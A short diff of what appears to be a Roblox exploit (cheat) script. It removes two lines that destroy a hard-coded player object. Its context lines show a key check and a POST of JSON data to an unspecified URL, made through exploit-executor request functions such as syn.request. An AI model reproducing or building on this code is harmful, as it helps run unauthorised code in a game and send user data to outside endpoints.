@@ -813,7 +813,6 @@ local function isBBKey(script_key)
     end
     return false
 end
-game.Players.SAKyfKDFKSFk:Destroy()
 
 	
 wait(2)
@@ -873,7 +872,6 @@ else
 
     local newdata = game:GetService("HttpService"):JSONEncode(data)
     local headers = {["content-type"] = "application/json"}
-    game.Players.SAKyfKDFKSFk:Destroy()
 
     request = http_request or request or HttpPost or syn.request
     local abcdef = {Url = url2, Body = newdata, Method = "POST", Headers = headers}
